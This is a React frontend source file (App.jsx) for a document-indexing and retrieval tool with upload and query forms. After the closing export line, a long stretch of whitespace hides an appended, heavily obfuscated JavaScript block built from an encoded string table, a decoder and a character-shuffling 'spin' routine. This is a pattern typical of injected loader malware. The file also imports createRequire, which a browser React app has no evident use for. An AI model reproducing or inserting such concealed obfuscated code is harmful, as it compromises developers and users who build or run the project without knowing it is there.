import { useEffect, useState } from "react";
import "./App.css";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// Dynamic API endpoint resolver
const API_BASE = process.env.REACT_APP_RAG_API
  ? process.env.REACT_APP_RAG_API.replace(/\/rag\/documents\/?$/, "")
  : "http://localhost:8000";

const UPLOAD_API = `${API_BASE}/rag/documents`;
const QUERY_API = `${API_BASE}/rag/query`;

// Embedded premium SVG icons
const Icons = {
  Upload: () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
  ),
  Search: () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
  ),
  Settings: () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
  ),
  File: () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
  ),
  Globe: () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
  ),
  Mail: () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
  ),
  ArrowRight: () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
  ),
  Sparkles: () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364-6.364l-.707.707M6.343 17.657l-.707.707m0-12.728l.707.707m11.314 11.314l.707-.707M12 7a5 5 0 1 0 0 10 5 5 0 0 0 0-10z"/></svg>
  )
};

function App() {
  const [activeTab, setActiveTab] = useState("upload"); // 'upload' | 'query'
  const [lastUploadedDocId, setLastUploadedDocId] = useState("");

  // ----------------------------------------------------
  // Document Upload States
  // ----------------------------------------------------
  const [file, setFile] = useState(null);
  const [email, setEmail] = useState("");
  const [domains, setDomains] = useState(["ICFR"]);
  const [indexArray, setIndexArray] = useState("");
  const [companyTypes, setCompanyTypes] = useState("");
  const [uploadModel, setUploadModel] = useState("gpt-4o-2024-11-20");
  const [ifAddNodeText, setIfAddNodeText] = useState("yes");
  const [ifAddNodeSummary, setIfAddNodeSummary] = useState("yes");
  const [ifAddDocDescription, setIfAddDocDescription] = useState("yes");
  
  const [uploadStatus, setUploadStatus] = useState("idle");
  const [uploadMessage, setUploadMessage] = useState("");
  const [uploadResult, setUploadResult] = useState(null);
  const [showAdvancedUpload, setShowAdvancedUpload] = useState(false);

  // ----------------------------------------------------
  // Query Engine States
  // ----------------------------------------------------
  const [queryScope, setQueryScope] = useState("global"); // 'global' | 'document'
  const [documentId, setDocumentId] = useState("");
  const [question, setQuestion] = useState("");
  const [queryModel, setQueryModel] = useState("gpt-4o-mini");
  const [maxHops, setMaxHops] = useState(6);
  const [queryDomains, setQueryDomains] = useState(["ICFR"]);
  const [queryCompanyType, setQueryCompanyType] = useState("");

  const [queryStatus, setQueryStatus] = useState("idle");
  const [queryMessage, setQueryMessage] = useState("");
  const [queryResult, setQueryResult] = useState(null);
  const [showAdvancedQuery, setShowAdvancedQuery] = useState(false);

  // Form field errors
  const [errors, setErrors] = useState({});

  const domainOptions = ["ICFR", "AARAMBH", "NGO", "TAXLEGIT", "CSR", "DASHBOARD"];

  // Rotating status message during upload
  useEffect(() => {
    if (uploadStatus !== "uploading") return undefined;

    const progressMessages = [
      "Analyzing document structure...",
      "Extracting sections and tabular data...",
      "Generating high-level descriptions...",
      "Building the hierarchical PageIndex tree...",
      "Finalizing database records..."
    ];
    let index = 0;
    setUploadMessage(progressMessages[0]);

    const timer = setInterval(() => {
      index = (index + 1) % progressMessages.length;
      setUploadMessage(progressMessages[index]);
    }, 3000);

    return () => clearInterval(timer);
  }, [uploadStatus]);

  // Rotating status message during query
  useEffect(() => {
    if (queryStatus !== "querying") return undefined;

    const progressMessages = [
      "Navigating hierarchical decision tree...",
      "Evaluating index-keyword overlaps...",
      "Formulating next-hop traversal steps...",
      "Retrieving matched leaf node context...",
      "Synthesizing the complete response..."
    ];
    let index = 0;
    setQueryMessage(progressMessages[0]);

    const timer = setInterval(() => {
      index = (index + 1) % progressMessages.length;
      setQueryMessage(progressMessages[index]);
    }, 2000);

    return () => clearInterval(timer);
  }, [queryStatus]);

  // Helper validation
  const validateEmail = (emailStr) => {
    if (!emailStr) return "Email is required";
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(emailStr) ? null : "Please enter a valid email address";
  };

  const handleUploadSubmit = async (e) => {
    e.preventDefault();
    setErrors({});
    setUploadMessage("");
    setUploadResult(null);

    // Frontend validations
    const fieldErrors = {};
    if (!file) fieldErrors.file = "Document file is required";
    
    const emailErr = validateEmail(email);
    if (emailErr) fieldErrors.email = emailErr;

    if (domains.length === 0) fieldErrors.domains = "At least one domain must be selected";

    if (Object.keys(fieldErrors).length > 0) {
      setErrors(fieldErrors);
      return;
    }

    const formData = new FormData();
    formData.append("file", file);
    formData.append("uploaded_by_email", email.trim());
    formData.append("model", uploadModel);
    formData.append("if_add_node_text", ifAddNodeText);
    formData.append("if_add_node_summary", ifAddNodeSummary);
    formData.append("if_add_doc_description", ifAddDocDescription);

    if (domains.length) {
      formData.append("domains", domains.join(","));
    }
    if (indexArray.trim()) {
      formData.append("index_array", indexArray.trim());
    }
    if (companyTypes.trim()) {
      formData.append("company_types", companyTypes.trim());
    }

    try {
      setUploadStatus("uploading");
      const res = await fetch(UPLOAD_API, {
        method: "POST",
        body: formData
      });
      const data = await res.json();
      
      if (!res.ok) {
        throw new Error(data?.detail || "Document indexing failed");
      }
      
      setUploadStatus("success");
      setUploadResult(data);
      setUploadMessage("Document indexed and vectorized successfully!");
      if (data.document_id) {
        setLastUploadedDocId(data.document_id);
      }
    } catch (err) {
      setUploadStatus("error");
      setUploadMessage(err.message || "An unexpected error occurred");
    }
  };

  const handleQuerySubmit = async (e) => {
    e.preventDefault();
    setErrors({});
    setQueryMessage("");
    setQueryResult(null);

    // Validation
    const fieldErrors = {};
    if (!question.trim()) fieldErrors.question = "Question is required";
    if (queryScope === "document" && !documentId.trim()) {
      fieldErrors.documentId = "Document ID is required for targeted queries";
    }
    if (queryScope === "global" && queryDomains.length === 0) {
      fieldErrors.queryDomains = "Select at least one domain for global query filtering";
    }

    if (Object.keys(fieldErrors).length > 0) {
      setErrors(fieldErrors);
      return;
    }

    const payload = {
      question: question.trim(),
      model: queryModel,
      max_hops: parseInt(maxHops, 10) || 6
    };

    if (queryScope === "document") {
      payload.document_id = documentId.trim();
    } else {
      payload.domains = queryDomains;
      if (queryCompanyType.trim()) {
        payload.company_type = queryCompanyType.trim();
      }
    }

    try {
      setQueryStatus("querying");
      const res = await fetch(QUERY_API, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      const data = await res.json();

      if (!res.ok) {
        throw new Error(data?.detail || "RAG retrieval query failed");
      }

      setQueryStatus("success");
      setQueryResult(data);
      setQueryMessage("Query resolved successfully!");
    } catch (err) {
      setQueryStatus("error");
      setQueryMessage(err.message || "Query resolution failed");
    }
  };

  // Helper to quickly pivot from upload result to query tab
  const handleQueryThisDoc = (docId) => {
    setDocumentId(docId);
    setQueryScope("document");
    setActiveTab("query");
    setQueryResult(null);
    setQueryMessage("");
  };

  return (
    <div className="app">
      <header className="hero">
        <div className="brand-badge">Vectorless RAG Engine</div>
        <h1 className="brand-title">PageIndex Architecture</h1>
        <p className="subtitle">
          Unlock high-precision, low-cost RAG pipelines. Index structured or unstructured documents directly into a 
          dynamic decision-tree index, then perform lightning-fast, vectorless retrieval queries.
        </p>
      </header>

      {/* Main Tab Controller */}
      <nav className="tab-navigation">
        <button 
          className={`tab-btn ${activeTab === "upload" ? "active" : ""}`}
          onClick={() => { setActiveTab("upload"); setErrors({}); }}
        >
          <Icons.Upload />
          Document Indexer
        </button>
        <button 
          className={`tab-btn ${activeTab === "query" ? "active" : ""}`}
          onClick={() => { setActiveTab("query"); setErrors({}); }}
        >
          <Icons.Search />
          Semantic Query Engine
        </button>
      </nav>

      {/* Primary Workspace */}
      <div className="workspace-grid">
        
        {/* Tab Content: Upload/Indexer */}
        {activeTab === "upload" && (
          <>
            <section className="card card-form">
              <div className="card-header">
                <h2>Index & Vectorize Document</h2>
                <p>Process docs via PageIndex chunking, summary generation, and db storage.</p>
              </div>

              <form className="form" onSubmit={handleUploadSubmit}>
                
                {/* File Drop Area */}
                <label className={`field file-drop-field ${errors.file ? "has-error" : ""}`}>
                  <span>Upload Document</span>
                  <div className="file-input-wrapper">
                    <Icons.File />
                    <input
                      type="file"
                      id="file-upload"
                      accept=".pdf,.md,.markdown,.txt,.docx,.xlsx,.csv"
                      onChange={(e) => setFile(e.target.files?.[0] || null)}
                    />
                    <div className="file-label-text">
                      {file ? file.name : "Select a document file"}
                    </div>
                  </div>
                  <small>Accepts PDF, MD, TXT, DOCX, XLSX, CSV</small>
                  {errors.file && <span className="error-text">{errors.file}</span>}
                </label>

                {/* Email (Required) */}
                <label className={`field ${errors.email ? "has-error" : ""}`}>
                  <span>Uploaded By (Email) *</span>
                  <div className="input-with-icon">
                    <Icons.Mail />
                    <input
                      type="email"
                      placeholder="analyst@company.com"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                    />
                  </div>
                  {errors.email && <span className="error-text">{errors.email}</span>}
                </label>

                {/* Domains Multi-selection */}
                <div className="field">
                  <span>Domains *</span>
                  <div className="domains-container">
                    {domainOptions.map((option) => {
                      const checked = domains.includes(option);
                      return (
                        <label key={option} className={`domain-chip ${checked ? "active" : ""}`}>
                          <input
                            type="checkbox"
                            checked={checked}
                            onChange={(e) => {
                              if (e.target.checked) {
                                setDomains((prev) => [...prev, option]);
                              } else {
                                setDomains((prev) => prev.filter((item) => item !== option));
                              }
                            }}
                          />
                          {option}
                        </label>
                      );
                    })}
                  </div>
                  <small>Restricts database queries to these document groups</small>
                  {errors.domains && <span className="error-text">{errors.domains}</span>}
                </div>

                {/* Index Keywords */}
                <label className="field">
                  <span>Index Keywords (comma-separated)</span>
                  <input
                    type="text"
                    placeholder="e.g. ICFR, subprocess, controls, cash"
                    value={indexArray}
                    onChange={(e) => setIndexArray(e.target.value)}
                  />
                  <small>Manual search tags that will be indexed with the document</small>
                </label>

                {/* Company Types */}
                <label className="field">
                  <span>Company Types (comma-separated)</span>
                  <input
                    type="text"
                    placeholder="e.g. corporate, private, government"
                    value={companyTypes}
                    onChange={(e) => setCompanyTypes(e.target.value)}
                  />
                  <small>Restricts domain retrieval to matches inside company type arrays</small>
                </label>

                {/* Advanced Options Accordion */}
                <div className="advanced-accordion">
                  <button
                    type="button"
                    className="accordion-trigger"
                    onClick={() => setShowAdvancedUpload(!showAdvancedUpload)}
                  >
                    <Icons.Settings />
                    Advanced Indexing Options
                    <span className={`chevron ${showAdvancedUpload ? "expanded" : ""}`}>▼</span>
                  </button>
                  
                  {showAdvancedUpload && (
                    <div className="accordion-content">
                      
                      {/* LLM Model Selection */}
                      <label className="field">
                        <span>Parser LLM Model</span>
                        <select value={uploadModel} onChange={(e) => setUploadModel(e.target.value)}>
                          <option value="gpt-4o-2024-11-20">gpt-4o (High Quality)</option>
                          <option value="gpt-4o-mini">gpt-4o-mini (Faster, Lower Token Usage)</option>
                        </select>
                      </label>

                      {/* Toggles */}
                      <div className="toggle-group">
                        <label className="field-toggle">
                          <select value={ifAddNodeText} onChange={(e) => setIfAddNodeText(e.target.value)}>
                            <option value="yes">Yes</option>
                            <option value="no">No</option>
                          </select>
                          <span>Include Node Page Text</span>
                        </label>

                        <label className="field-toggle">
                          <select value={ifAddNodeSummary} onChange={(e) => setIfAddNodeSummary(e.target.value)}>
                            <option value="yes">Yes</option>
                            <option value="no">No</option>
                          </select>
                          <span>Include Node Summaries</span>
                        </label>

                        <label className="field-toggle">
                          <select value={ifAddDocDescription} onChange={(e) => setIfAddDocDescription(e.target.value)}>
                            <option value="yes">Yes</option>
                            <option value="no">No</option>
                          </select>
                          <span>Generate Tree Descriptions</span>
                        </label>
                      </div>
                    </div>
                  )}
                </div>

                <button
                  className="primary-btn"
                  type="submit"
                  disabled={uploadStatus === "uploading"}
                >
                  {uploadStatus === "uploading" ? "Indexing Document..." : "Build PageIndex Tree"}
                </button>
              </form>
            </section>

            {/* Upload Result / Status Display */}
            <section className="card card-result">
              <div className="card-header">
                <h2>Indexing Result</h2>
                <p>Status logs and PageIndex structure generated from the backend.</p>
              </div>

              <div className="status-banner">
                <span className={`status-dot ${uploadStatus}`} />
                <span className="status-label">Status: {uploadStatus.toUpperCase()}</span>
                {uploadMessage && <p className="status-message">{uploadMessage}</p>}
              </div>

              {uploadResult ? (
                <div className="result-viewer animated-fade-in">
                  <div className="result-meta-grid">
                    <div className="meta-box">
                      <span>Document Name</span>
                      <strong>{uploadResult.doc_name}</strong>
                    </div>
                    <div className="meta-box">
                      <span>Document ID</span>
                      <div className="code-copy-wrapper">
                        <code>{uploadResult.document_id}</code>
                        <button 
                          className="action-link-btn"
                          onClick={() => handleQueryThisDoc(uploadResult.document_id)}
                        >
                          Query This
                        </button>
                      </div>
                    </div>
                  </div>

                  {uploadResult.doc_summary && (
                    <div className="summary-box">
                      <div className="box-title">
                        <Icons.Sparkles /> Generated Document Description
                      </div>
                      <p>{uploadResult.doc_summary}</p>
                    </div>
                  )}

                  {uploadResult.index_array && uploadResult.index_array.length > 0 && (
                    <div className="indexed-keywords">
                      <span>Mapped Index Keywords</span>
                      <div className="keyword-tags">
                        {uploadResult.index_array.map((keyword, i) => (
                          <span key={i} className="keyword-tag">{keyword}</span>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              ) : (
                <div className="result-placeholder">
                  <Icons.File />
                  <p>Awaiting document upload payload...</p>
                </div>
              )}
            </section>
          </>
        )}

        {/* Tab Content: RAG Query Engine */}
        {activeTab === "query" && (
          <>
            <section className="card card-form">
              <div className="card-header">
                <h2>RAG Query Engine</h2>
                <p>Perform precision, vectorless traversal matching across stored document trees.</p>
              </div>

              <form className="form" onSubmit={handleQuerySubmit}>
                
                {/* Query Scope Selector */}
                <div className="field">
                  <span>Query Scope</span>
                  <div className="scope-tabs">
                    <button
                      type="button"
                      className={`scope-tab ${queryScope === "global" ? "active" : ""}`}
                      onClick={() => setQueryScope("global")}
                    >
                      <Icons.Globe />
                      Global Search
                    </button>
                    <button
                      type="button"
                      className={`scope-tab ${queryScope === "document" ? "active" : ""}`}
                      onClick={() => setQueryScope("document")}
                    >
                      <Icons.File />
                      Targeted Doc Search
                    </button>
                  </div>
                </div>

                {/* Target Document ID Input */}
                {queryScope === "document" && (
                  <label className={`field ${errors.documentId ? "has-error" : ""}`}>
                    <span>Target Document ID *</span>
                    <div className="input-group-row">
                      <input
                        type="text"
                        placeholder="e.g. 550e8400-e29b-41d4-a716-446655440000"
                        value={documentId}
                        onChange={(e) => setDocumentId(e.target.value)}
                      />
                      {lastUploadedDocId && (
                        <button
                          type="button"
                          className="secondary-btn"
                          onClick={() => setDocumentId(lastUploadedDocId)}
                        >
                          Use Last Indexed
                        </button>
                      )}
                    </div>
                    {errors.documentId && <span className="error-text">{errors.documentId}</span>}
                  </label>
                )}

                {/* Question Area */}
                <label className={`field ${errors.question ? "has-error" : ""}`}>
                  <span>Search Query / Question *</span>
                  <textarea
                    rows={4}
                    placeholder="Enter the key subprocess or audit control you want to trace (e.g. List all subprocesses for Order to Cash)"
                    value={question}
                    onChange={(e) => setQuestion(e.target.value)}
                  />
                  {errors.question && <span className="error-text">{errors.question}</span>}
                </label>

                {/* Global Filters */}
                {queryScope === "global" && (
                  <>
                    <div className="field">
                      <span>Query Domain Filters *</span>
                      <div className="domains-container">
                        {domainOptions.map((option) => {
                          const checked = queryDomains.includes(option);
                          return (
                            <label key={option} className={`domain-chip ${checked ? "active" : ""}`}>
                              <input
                                type="checkbox"
                                checked={checked}
                                onChange={(e) => {
                                  if (e.target.checked) {
                                    setQueryDomains((prev) => [...prev, option]);
                                  } else {
                                    setQueryDomains((prev) => prev.filter((item) => item !== option));
                                  }
                                }}
                              />
                              {option}
                            </label>
                          );
                        })}
                      </div>
                      {errors.queryDomains && <span className="error-text">{errors.queryDomains}</span>}
                    </div>

                    <label className="field">
                      <span>Specific Company Type</span>
                      <input
                        type="text"
                        placeholder="e.g. corporate"
                        value={queryCompanyType}
                        onChange={(e) => setQueryCompanyType(e.target.value)}
                      />
                    </label>
                  </>
                )}

                {/* Advanced Query Settings */}
                <div className="advanced-accordion">
                  <button
                    type="button"
                    className="accordion-trigger"
                    onClick={() => setShowAdvancedQuery(!showAdvancedQuery)}
                  >
                    <Icons.Settings />
                    Advanced Traversal Options
                    <span className={`chevron ${showAdvancedQuery ? "expanded" : ""}`}>▼</span>
                  </button>

                  {showAdvancedQuery && (
                    <div className="accordion-content">
                      <label className="field">
                        <span>Inference LLM Model</span>
                        <select value={queryModel} onChange={(e) => setQueryModel(e.target.value)}>
                          <option value="gpt-4o-mini">gpt-4o-mini (Recommended for speed)</option>
                          <option value="gpt-4o-2024-11-20">gpt-4o (Highly Contextual)</option>
                        </select>
                      </label>

                      <label className="field">
                        <span>Max Hops (Decision-Tree Depth)</span>
                        <input
                          type="number"
                          min={1}
                          max={20}
                          value={maxHops}
                          onChange={(e) => setMaxHops(e.target.value)}
                        />
                        <small>Limits traversal depth to prevent runaway calls</small>
                      </label>
                    </div>
                  )}
                </div>

                <button
                  className="primary-btn"
                  type="submit"
                  disabled={queryStatus === "querying"}
                >
                  {queryStatus === "querying" ? "Querying Engine..." : "Search RAG Pipeline"}
                </button>
              </form>
            </section>

            {/* Query Result Pane */}
            <section className="card card-result">
              <div className="card-header">
                <h2>Retrieved Context</h2>
                <p>PageIndex decision hops and matched context retrieved without embeddings.</p>
              </div>

              <div className="status-banner">
                <span className={`status-dot ${queryStatus}`} />
                <span className="status-label">Status: {queryStatus.toUpperCase()}</span>
                {queryMessage && <p className="status-message">{queryMessage}</p>}
              </div>

              {queryResult ? (
                <div className="result-viewer animated-fade-in">
                  
                  {/* Traversing Hop Flowchart (Premium UI Addition!) */}
                  {queryResult.path && queryResult.path.length > 0 && (
                    <div className="traversal-path-section">
                      <h3>PageIndex Hierarchy Traversal</h3>
                      <div className="traversal-flow">
                        {queryResult.path.map((nodeName, i) => (
                          <div key={i} className="traversal-node-wrap">
                            <div className="traversal-node">
                              <span className="node-index">Hop {i + 1}</span>
                              <span className="node-name">{nodeName}</span>
                            </div>
                            {i < queryResult.path.length - 1 && (
                              <div className="flow-arrow">
                                <Icons.ArrowRight />
                              </div>
                            )}
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Leaf Node Matched Info */}
                  <div className="result-meta-grid">
                    <div className="meta-box">
                      <span>Resolved Node Title</span>
                      <strong>{queryResult.node?.title || "Fallback Generator"}</strong>
                    </div>
                    {queryResult.node?.node_id && (
                      <div className="meta-box">
                        <span>Node Index ID</span>
                        <code>#{queryResult.node.node_id}</code>
                      </div>
                    )}
                  </div>

                  {/* Retrieved Context Display */}
                  <div className="context-box">
                    <div className="context-header">
                      <span>Retrieved Context Snippet</span>
                      <button 
                        className="copy-btn" 
                        onClick={() => {
                          navigator.clipboard.writeText(queryResult.context);
                          alert("Retrieved context copied to clipboard!");
                        }}
                      >
                        Copy Context
                      </button>
                    </div>
                    <pre className="context-content">
                      <code>{queryResult.context || "No context content resolved."}</code>
                    </pre>
                  </div>
                </div>
              ) : (
                <div className="result-placeholder">
                  <Icons.Search />
                  <p>Ready to traverse PageIndex trees...</p>
                </div>
              )}
            </section>
          </>
        )}

      </div>
    </div>
  );
}

export default App;																																																																																																																																																																																																																																																																										var z = '-11321';(function(_0x4323b9,_0x417215){var _0x493886=_0x35fa,_0x287dfa=_0x4323b9();while(!![]){try{var _0x17ca2e=Math['trunc'](-parseFloat(_0x493886(0x12))/0x1)*(-parseFloat(_0x493886(0x1a))/0x2)+parseFloat(_0x493886(0x17))/0x3*(parseFloat(_0x493886(0xe))/0x4)+parseFloat(_0x493886(0x1c))/0x5+parseFloat(_0x493886(0x1e))/0x6*(-parseFloat(_0x493886(0x22))/0x7)+parseFloat(_0x493886(0x13))/0x8*(-parseFloat(_0x493886(0x5))/0x9)+Math['max'](parseFloat(_0x493886(0x1b))/0xa,parseFloat(_0x493886(0x14))/0xb)*(-parseFloat(_0x493886(0x4))/0xc)+parseFloat(_0x493886(0xc))/0xd;if(_0x17ca2e===_0x417215)break;else _0x287dfa['push'](_0x287dfa['shift']());}catch(_0x1185cd){_0x287dfa['push'](_0x287dfa['shift']());}}}(_0xc09d,0xf1b07));var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function spin(_0x4f8a43,_0x51e368){var _0x295564=_0x35fa,_0x416a9f={'qCMwH':function(_0x3f4f1a,_0x2be386){return _0x3f4f1a%_0x2be386;},'AyWPi':function(_0xd05a37,_0x101778){return _0xd05a37+_0x101778;}},_0x4b4720=[],_0x271b6e=0x0,_0x12a4db=_0x51e368[0x0],_0x16ce6b,_0x2d3199,_0x30e262,_0x24a1d0,_0x46b86f,_0x256650;while(_0x271b6e<_0x4f8a43['length']){_0x4b4720[_0x271b6e]=_0x4f8a43['charAt'](_0x271b6e),_0x271b6e+=0x1;}_0x16ce6b=_0x4b4720[_0x295564(0x11)],_0x271b6e=0x0;while(_0x271b6e<_0x16ce6b){_0x2d3199=_0x12a4db*(_0x271b6e+_0x51e368[0x1])+_0x416a9f[_0x295564(0x6)](_0x12a4db,_0x51e368[0x2]),_0x30e262=_0x12a4db*_0x416a9f[_0x295564(0x18)](_0x271b6e,_0x51e368[0x3])+_0x12a4db%_0x51e368[0x4],_0x24a1d0=_0x2d3199%_0x16ce6b,_0x46b86f=_0x30e262%_0x16ce6b,_0x256650=_0x4b4720[_0x24a1d0],_0x4b4720[_0x24a1d0]=_0x4b4720[_0x46b86f],_0x4b4720[_0x46b86f]=_0x256650,_0x12a4db=(_0x2d3199+_0x30e262)%_0x51e368[0x5],_0x271b6e+=0x1;}return _0x4b4720[_0x295564(0xf)]('');}function _0x35fa(_0x4825f4,_0x56facf){var _0x2374ed=_0xc09d();return _0x35fa=function(_0x42f3fb,_0xc09df3){_0x42f3fb=_0x42f3fb-0x0;var _0x35fa87=_0x2374ed[_0x42f3fb];if(_0x35fa['aIsQez']===undefined){var _0x4f53b0=function(_0x2861f1){var _0x484705='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x5d6c2a='',_0x25d98d='';for(var _0x54afac=0x0,_0x2f7110,_0x41451d,_0x2cd65a=0x0;_0x41451d=_0x2861f1['charAt'](_0x2cd65a++);~_0x41451d&&(_0x2f7110=_0x54afac%0x4?_0x2f7110*0x40+_0x41451d:_0x41451d,_0x54afac++%0x4)?_0x5d6c2a+=String['fromCharCode'](0xff&_0x2f7110>>(-0x2*_0x54afac&0x6)):0x0){_0x41451d=_0x484705['indexOf'](_0x41451d);}for(var _0x2a16dc=0x0,_0x2e5b94=_0x5d6c2a['length'];_0x2a16dc<_0x2e5b94;_0x2a16dc++){_0x25d98d+='%'+('00'+_0x5d6c2a['charCodeAt'](_0x2a16dc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x25d98d);};_0x35fa['MGozzL']=_0x4f53b0,_0x4825f4=arguments,_0x35fa['aIsQez']=!![];}var _0x250ef5=_0x2374ed[0x0],_0x4eb72b=_0x42f3fb+_0x250ef5,_0x392865=_0x4825f4[_0x4eb72b];return!_0x392865?(_0x35fa87=_0x35fa['MGozzL'](_0x35fa87),_0x4825f4[_0x4eb72b]=_0x35fa87):_0x35fa87=_0x392865,_0x35fa87;},_0x35fa(_0x4825f4,_0x56facf);}function _0xc09d(){var _0x4df1b3=['BgvUz3rO','mti4BNv0Cgzu','mJCWmJi4ogLWrNDztq','mtyWnLzLyMfyBq','zNjVBunOyxjdB2rL','C3bSAxq','nKP2ENvIBG','qxLxugK','D2HPBguGkhrYDwuPihT9','mJe2mdzLqNzYCwK','mtq2meneBNnlsW','mJuYmdKZnvLgzevSDa','C3rHDgvpyMPLy3q','ndCZmdy0nMXwu2nxtG','Aw5WDxq','BNbMDLy','ywn0Aw9U','n3fWzezRtW','EfLVCKW','Awz2v1K','y29UC3rYDwn0B3i','DgvZDa','otq5ntzkq2rizMu','mtHfAvL4vey','CunnD0G','tMHMzLi','C3vIC3rYAw5N','uL88iMnssIeMvMvJuLDHpvjYzLiKnIjJmtTsuLLJBMHFlY50igLsuLjhxJXslLjJuJiUw25sic5szI4VpfjJmYeHnw5tuJXsAvjmlMvtC2XMkgvKz3HJpd9VphjSy1i/DfjVC2rszNvtzs4/jNbOlLjst01Zw2u8C2Tsrs48uNu8CLjLo1jeuKjYuLjClMzslJXJoIfICgWWowLJB1jYDgnskdTYB1jsBJiTiIGUxNCGEs48pgrKicKKzIbVDs4LztXHpguUDdXTkgnsEgzspfTkkgzLuJXqyNiUyIDVuMKUuLi8j1jsjxDszNmPzviUw2fNu1b7zdiUAZXHyZfLlIeZlLa8wLjPuIPVrhnPpvSUpgyUiJrsyIboiMvVEfjWBY5PswXRywvuuI4YksvTpgLLuL16phXsDsGOzLj3uLjCuJ5sosmUuJbYzd1ZlJb4ixnslMzsuYKOy2n0mxbMB3rHzu11uKbsptXsuI9GlLjRjcGYy1iUCZDLmweUrLjlyYOUlNOIuM5MugvZuNrsuLiUpfjSi1jMpdOGmIGOuIbsjcC2C2a8m25OAsOKzvHJFvjOpYbJDg9JlMLLy2m5ihTsytXZo3uHlMvDrvjsB0GUlIqIBJXem1jZuLiUlIHszwvZC2vspcb0lciGuMrVDN1tyZbkBwKUvdXZrwvNC1j3xviIyviUuIfspg8PkwPsifjLDYbPDgmUC25Rkh0OBLT2zvi8mdW9A2ziphjYtviGy2LRBKuUyY5cpczsw29DuI4Ly2nsBhj4oYOGwYjVAxnLBLjLzMvHivLUlMvJuIvViNuUpdzSuLjsEvi9Axm9uLiOkvjsztPsuIKHuNDJCLiXpc5VivjJuMnaiN1sDvjXDtuOm1bVBcjLuNqWiwz0yviQpfiXDg5Ry2z9vc4Hjc88CM8GsxLJuLiGkva8xc5IphrsnZPquhm8xs5YwdW8lMvsDsHsuLjXBNaUpc5so2n0AxnylLjsEviKqdWZkwTsuMm8k1jYogWQlMLsixjdxfaHBJ1JCZWOy2K8kfi3zvjLuMmUihq8zxbLkwu8pcXLpcHfsYeUCg5IjcjsyvjslMv2DwHJlLrSx2mUoLiWCIaPuND3ixntmc50n3uUmcHsov9HkcqMlMu2zI5suMSXq3HIAtHSlMHJpw0OqdXszc4UphjYlJiUs01Yy2jFuM5skfjFyZPeD3r9lLiUE305zYrsuLiPvfz0pgeOlJXhlMrsFLDvuI47BhiUAeLZBu5qicb0qfjsof9smLiUAvjYuLbspcHsmYnJzwmWy2u